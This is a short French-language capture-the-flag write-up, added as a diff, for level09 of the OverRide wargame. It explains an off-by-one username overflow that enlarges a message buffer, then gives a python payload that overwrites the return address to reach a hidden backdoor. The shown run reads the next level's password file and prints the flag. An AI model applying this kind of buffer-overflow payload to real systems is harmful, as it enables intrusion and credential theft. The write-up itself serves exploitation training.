@@ -1,0 +1,28 @@
+On remarque que c'est un program qui recoit deux input.
+le premier pour sauver le username dans stack et le deuxieme pour sauver le message dans stack.
+On remarque que dans la fonction 'set_username' il stock 40eme characteres alors que la taille de buffer username vaut 40
+donc on peut modifier un octet apres le buffer. On remarque ce un octet va nous permettre de modifier la taille de message qu'on va taper.
+par default la taille de message vaut 140 mais grace a ce petit overflow, on peut modifier en sorte que ca depasse 140 et on espere qu'on va modifier 
+l'address du retour de la fonction handle_msg().
+
+Ret address of handle_msg :         0x0000555555554abd
+Ret address of secret_backdoor : 0x000055555555488c
+
+
+Quand la taille de message vaut 202, c'est assez pour modifier 2 octets de ret address.
+on modifie que 2 octets car les autres valeurs sont exactement pareils donc on n'a pas besoin de faire plus.
+
+Premier msg va être "X"*40+"\xca\n"
+Deuxième va être "X"*200+"\x8c\x48" 
+
+level09@OverRide:~$ python -c 'print("X"*40+"\xca\n" + "X"*200+"\x8c\x48" + "\n"+"cat /home/users/end/.pass")' > /tmp/p
+level09@OverRide:~$ ./level09 < /tmp/p
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX�>: Msg @Unix-Dude
+>>: >: Msg sent!
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+Segmentation fault (core dumped)
+level09@OverRide:~$
